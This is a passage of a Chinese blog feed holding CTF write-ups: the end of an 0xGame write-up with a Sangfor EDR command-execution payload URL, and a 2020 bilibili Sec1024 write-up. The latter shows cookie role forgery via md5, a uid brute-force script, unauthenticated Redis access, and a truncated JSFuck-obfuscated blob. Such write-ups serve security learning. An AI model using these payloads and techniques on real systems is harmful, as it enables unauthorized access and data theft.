class="token punctuation">(</span><span class="token string">'Work harder!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>Good job<span class="token operator">!</span>Congratulations<span class="token operator">!</span>0xGame<span class="token punctuation">{</span>947eae96fe415cbc6eab176f15dd98b1<span class="token punctuation">}</span></code></pre><h3 id="Web-edr"><a href="#Web-edr" class="headerlink" title="Web_edr"></a>Web_edr</h3><p><strong>深信服 RCE</strong></p><p>参考：</p><p><a href="https://blog.csdn.net/qq_37602797/article/details/108068122" target="_blank" rel="noopener">https://blog.csdn.net/qq_37602797/article/details/108068122</a></p><p><a href="https://mp.weixin.qq.com/s/4VtJ_M0c5GZsV4CmBr9CsQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/4VtJ_M0c5GZsV4CmBr9CsQ</a></p><p><strong>payload:</strong></p><blockquote><p><a href="http://web1.game.0xctf.com:40000/?strip_slashes=system&amp;host=cat%20/flag" target="_blank" rel="noopener">http://web1.game.0xctf.com:40000/?strip_slashes=system&amp;host=cat%20/flag</a></p></blockquote><p><code>0xGame{S4n9f0r_3dR_c4N_Rce_reC3n7_D4y}</code></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>还是挺有意思的。</p><p><em>（首尾呼应</em></p><p>（溜了喵</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2020 bilibili Sec1024 WriteUp</title>
      <link href="/2020/10/26/CTF_2020bilibiliSec1024/"/>
      <url>/2020/10/26/CTF_2020bilibiliSec1024/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/83b92f73637ab8056346bb6b8a3af6d9840e8bb0.jpg" alt=""></p><p>Bilibili 小破站整了个 Sec1024，1024 凌晨看群里有师傅提到就来看了一眼。</p><p>结果被卡住了做不下去，于是又看了一下午。。</p><p><strong>2020-1024=996</strong></p><p>所以大家都加班了唉？</p><p>属实恶心人（</p><p>随意写个 Write Up 好了。</p><blockquote><p>P.S.: </p><p>按道理，比赛未结束不应该发出来的，不过算了8，现在一搜到处都是 flag 了，开心就好。</p></blockquote><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201026010246030.png" alt=""></p><hr><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>页面的背后是什么？</p><p><a href="http://45.113.201.36/index.html" target="_blank" rel="noopener">http://45.113.201.36/index.html</a></p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201025231922476.png" alt="1"></p><p>一看到就以为是改 UA，谁知道其实是第二题的答案2333.</p><p>第一题在这里</p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201025232041445.png" alt="flag1"></p><p>其实是调用了 <a href="http://45.113.201.36/api/admin" target="_blank" rel="noopener">http://45.113.201.36/api/admin</a> 这个接口。</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>真正的秘密只有特殊的设备才能看到</p><p>改 UA 即可。</p><p><a href="http://45.113.201.36/api/ctf/2" target="_blank" rel="noopener">http://45.113.201.36/api/ctf/2</a></p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201025232314019.png" alt="flag2"></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>密码是啥？</p><p><a href="http://45.113.201.36/login.html" target="_blank" rel="noopener">http://45.113.201.36/login.html</a></p><p>本来以为是 sql 注入，但试了发现不对劲，怎么都注不进去。盲注的话也没有所需要的返回信息。</p><p>最后应该只有弱密码了。</p><p>跑了一堆字典都不行，最后突然一想，手输了个 <code>bilibili</code> 出来了。</p><p><em>（摊手，就离谱</em></p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201024125447298.png" alt="flag3"></p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>对不起，权限不足～</p><p><a href="http://45.113.201.36/" target="_blank" rel="noopener">http://45.113.201.36/</a></p><p>superadmin.html</p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201024171348245.png" alt="4"></p><pre class=" language-javascript"><code class="language-javascript">$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    url<span class="token punctuation">:</span> <span class="token string">"api/ctf/4"</span><span class="token punctuation">,</span>    type<span class="token punctuation">:</span> <span class="token string">"get"</span><span class="token punctuation">,</span>    success<span class="token punctuation">:</span><span class="token keyword">function</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 如果有值：前端跳转</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string">"欢迎超级管理员登陆～答案是 : {{ "</span> <span class="token operator">+</span> data<span class="token punctuation">.</span>data <span class="token operator">+</span> <span class="token string">" }}"</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 如果没值</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string">"有些秘密只有超级管理员才能看见哦~"</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>发现请求这个 API 会返回一个名为 <code>role</code> 的 cookie，里面内容正好32位，考虑就是 md5 了。</p><p><code>ee11cbb19052e40b07aac0ca060c23ee</code></p><p>解密发现这个是 <code>user</code>。</p><p>既然说要<strong>超级管理员</strong>， 那应该就是改这个了。</p><p>试了 superadmin, admin, root, administrator, superuser, bilibili, … 都不对。</p><p>最后发现是 Administrator。这不是脑筋急转弯嘛？？？</p><p>md5 –&gt; <code>7b7bc2512ee1fedcd76bdc68926d4f7b</code></p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201024171757737.png" alt="flag4"></p><p>哦对了，cookie 要带上 session，里面记录了用户登录信息，否则会提示 <code>请先登录</code>。</p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>别人的秘密</p><p><a href="http://45.113.201.36/user.html" target="_blank" rel="noopener">http://45.113.201.36/user.html</a></p><pre class=" language-javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>$<span class="token punctuation">)</span> <span class="token punctuation">{</span>        $<span class="token punctuation">.</span>getUrlParam <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token string">"(^|&amp;)"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"=([^&amp;]*)(&amp;|$)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">var</span> r <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>reg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">unescape</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>jQuery<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> uid <span class="token operator">=</span> $<span class="token punctuation">.</span><span class="token function">getUrlParam</span><span class="token punctuation">(</span><span class="token string">'uid'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>uid <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        uid <span class="token operator">=</span> <span class="token number">100336889</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        url<span class="token punctuation">:</span> <span class="token string">"api/ctf/5?uid="</span> <span class="token operator">+</span> uid<span class="token punctuation">,</span>        type<span class="token punctuation">:</span> <span class="token string">"get"</span><span class="token punctuation">,</span>        success<span class="token punctuation">:</span><span class="token keyword">function</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 如果有值：前端跳转</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string">"欢迎超级管理员登陆～flag : "</span> <span class="token operator">+</span> data<span class="token punctuation">.</span>data <span class="token punctuation">)</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 如果没值</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string">"这里没有你想要的答案～"</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在所给的 uid 100336889 附近爆破。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">import</span> timex <span class="token operator">=</span> <span class="token number">100336889</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Linux; Android 6.0.1; MuMu Build/V417IR; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36'</span><span class="token punctuation">,</span>    <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'en-US,en;q=0.5'</span><span class="token punctuation">,</span>    <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'session=xxxxxxxxxxxxxxxxxxx'</span><span class="token punctuation">}</span><span class="token keyword">for</span> uid <span class="token keyword">in</span> range<span class="token punctuation">(</span>x<span class="token number">-1500</span><span class="token punctuation">,</span> x<span class="token operator">+</span><span class="token number">1500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span>        url <span class="token operator">=</span> f<span class="token string">'http://45.113.201.36/api/ctf/5?uid={str(uid)}'</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>        r_json <span class="token operator">=</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r_json<span class="token punctuation">)</span>        <span class="token keyword">if</span> r_json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'!!!!!!!!!!!!'</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>r_json<span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        uid <span class="token operator">=</span> uid<span class="token number">-1</span></code></pre><p>最后发现 uid 是 100336917，偏移量就 28…</p><p><code>6d917dff-eb085a50-58b6513f-5c0c3248</code></p><p>或者 Burp Suite 也行。</p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201024181117648.png" alt="flag5"></p><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p>结束亦是开始</p><p><a href="http://45.113.201.36/blog/single.php?id=1" target="_blank" rel="noopener">http://45.113.201.36/blog/single.php?id=1</a></p><p>是个奇怪的博客页面。</p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201026012113816.png" alt="6"></p><p>上面一行导航栏都 404，感觉上应该是 <code>id</code> 参数的注入？</p><p>没搞懂（</p><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><p>接下来的旅程，需要少年自己去探索啦～</p><p><strong>（盲猜就离谱</strong></p><p>未知。</p><h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><p>6379 Redis 端口</p><pre class=" language-bash"><code class="language-bash">redis-cli.exe -h 45.113.201.3645.113.201.36:6379<span class="token operator">></span> get flag8<span class="token string">"d436b982-2b81aa54-49a8d2db-87ab951a"</span></code></pre><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201026003804481.png" alt="flag8"></p><blockquote><p>以及，被搅 shi 了？</p><p><img src="/2020/10/26/CTF_2020bilibiliSec1024/image-20201026004204074.png" alt="喵喵喵？"></p></blockquote><h2 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h2><p>未知。</p><h2 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h2><p>路径盲猜（就狂扫呗</p><p><a href="http://45.113.201.36/blog/test.php" target="_blank" rel="noopener">http://45.113.201.36/blog/test.php</a></p><pre><code>[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+[]))+(+{}+[])[+!![]]+(!![]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(+!![]+[])+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+[])+([][[]]+[])[!+[]+!![]])+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![